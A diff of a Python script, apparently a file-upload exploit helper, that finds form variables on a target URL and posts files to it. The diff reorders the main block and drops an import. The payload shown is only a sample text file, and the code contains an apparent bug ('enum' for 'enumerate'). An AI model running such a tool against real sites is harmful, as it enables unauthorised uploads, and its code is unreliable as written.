@@ -50,19 +50,6 @@ def upload(url):
     var = extract_names(html)
     return var
 
-
-
-if args.url:
-    print(f"[+] Exploit {args.url}")
-    response = upload(args.url)
-    if len(response) >= 2:
-        for idx, var in enum(response):
-            print(f"[{idx}] {var}")
-    elif len(response) == 0:
-        print("[!] No variable  or form found, specify with (-v | --var)")
-
-    import requests
-
 def upload_files(url, files_dict, extra_params=None):
 
     files = {}
@@ -76,7 +63,9 @@ def upload_files(url, files_dict, extra_params=None):
     url = args.url
     r = requests.post(url, files=files, data=extra_params or {})
     return r
-      
+
+
+
 payloads = {
     "file1": {
         "file_name": "sample.txt",
@@ -99,5 +88,13 @@ resp = upload_files(
 print(resp.status_code)
 print(resp.text[:500])
 
+if args.url:
+    print(f"[+] Exploit {args.url}")
+    response = upload(args.url)
+    if len(response) >= 2:
+        for idx, var in enum(response):
+            print(f"[{idx}] {var}")
+    elif len(response) == 0:
+        print("[!] No variable  or form found, specify with (-v | --var)")
 else:
     print("[!] You need to specify an url (-u | --url)")
